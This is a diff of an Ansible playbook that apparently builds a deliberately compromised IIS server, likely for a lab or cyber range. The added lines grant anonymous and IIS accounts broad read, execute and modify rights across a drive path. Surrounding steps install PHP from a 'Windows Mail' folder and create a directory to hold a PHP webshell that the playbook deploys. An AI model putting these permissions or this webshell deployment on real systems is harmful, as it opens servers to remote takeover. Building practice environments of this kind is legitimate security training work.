@@ -53,10 +53,47 @@
 
           & $appcmd set config /section:system.webServer/handlers "/+[name='PHP-FastCGI',path='*.php',verb='GET,HEAD,POST',modules='FastCgiModule',scriptProcessor='C:\Program Files\Windows Mail\PHP\php-cgi.exe',resourceType='Either']" /commit:apphost
 
+      #grant IIS access to full file directory
+    - name: Grant Read and Execute permissions to IIS_IUSRS on the C:\ folder
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IIS_IUSRS"
+        rights: "ReadAndExecute"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+
+    - name: Grant Read and Execute permissions to IUSR (for Anonymous Auth)
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IUSR"
+        rights: "ReadAndExecute"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+
+    - name: Grant Modify permissions to the Application Pool identity
+      ansible.windows.win_acl:
+        path: "{{ custom_c_path }}"
+        user: "IIS AppPool\\{{ iis_app_pool }}"
+        rights: "Modify"
+        type: "allow"
+        state: "present"
+        inherit: "ContainerInherit, ObjectInherit"
+        propagation: "None"
+      when: true
+
     - name: Create directory to hold webshell
       ansible.windows.win_powershell:
         script: |
           New-Item -Path 'C:\inetpub\wwwroot\ImageContainer' -ItemType Directory -Force | Out-Null
+
+    #- name: Create deep directory to hold webshell
+    #  ansible.windows.win_powershell:
+    #    script: |
+    #      New-Item -Path 'C:\inetpub\wwwroot\ImageContainer' -ItemType Directory -Force | Out-Null
 
     - name: Deploy PHP webshell
       ansible.windows.win_copy:
